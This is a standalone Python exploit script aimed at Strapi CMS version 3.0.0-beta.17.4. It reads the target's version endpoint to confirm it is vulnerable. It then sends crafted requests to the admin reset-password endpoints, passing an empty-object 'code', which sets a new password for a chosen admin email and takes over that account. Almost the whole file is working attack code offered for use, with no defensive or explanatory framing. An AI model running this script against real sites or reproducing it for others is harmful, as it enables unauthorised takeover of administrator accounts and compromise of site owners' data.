#!/usr/bin/python3
import requests, os, json, sys, time, signal

# Variable

email = 'example@gmail.com'

# Colors
class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'

# Functions
def cls():
    time.sleep(0.5)
    os.system('cls' if os.name=='nt' else 'clear')

# CTRL + C
def handler(signum, frame):
    cls()
    print(colors.RED + '\n[!] Exiting succes (CTRL + C)..\n', signum + colors.WHITE)
    cls()
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

if len(sys.argv) != 2:
    cls()
    print(colors.RED + "\n[!] "+ colors.WHITE+"Use: python3 " + sys.argv[0], colors.BLUE + "<http[s]://domain.com>\n")
    print(colors.GREEN + "         # Set up the email in the file\n")


def password():
    cls()
    print(colors.BLUE+'\nâš '+ colors.RED + 'Set password \n')
    password = input(colors.GREEN + '> ' + colors.WHITE)
    cls()
    confirmation = {
        'email': email
        }
    r = requests.post(sys.argv[1]+'/admin/plugins/users-permissions/auth/reset-password', json=confirmation)
    cve = {
        'code': {},
        'password': password,
        'passwordConfirmation': password
        }

    print(colors.RED + '[!] ' + colors.WHITE +'Change password..')
    r = requests.post(sys.argv[1]+'/admin/auth/reset-password', json=cve)
    print(colors.RED + '[!] ' + colors.WHITE +'The password was changed to '+colors.RED + password)
    print(colors.GREEN + '# If the password is not changed it is because the email is incorrect or you did not modify it ('+sys.argv[0]+')'+colors.WHITE)

def version():
    cls()
    if sys.argv[1].startswith('http'):
        try:
            r = requests.get(sys.argv[1]+'/admin/strapiVersion').json()
        except:
            cls()
            print(colors.RED + "\n[!] "+ colors.WHITE + "Website not found\n")
            sys.exit(0)
    else:
        cls()
        print(colors.RED + "\n[!] "+ colors.WHITE + "Does not contain http/s\n")
        sys.exit(0)

    if r['strapiVersion'] != '3.0.0-beta.17.4':
        cls()
        print(colors.RED+ '\n[!] ' + colors.WHITE + 'The estrapi version is not vulnerable\n')
        cls()
        sys.exit(0)
    else:
        print(colors.RED+ '\n[!] ' + colors.WHITE + 'The version of estrapi if it can be compromised\n')
        time.sleep(0.4)
        password()


if __name__ == '__main__':
    version()
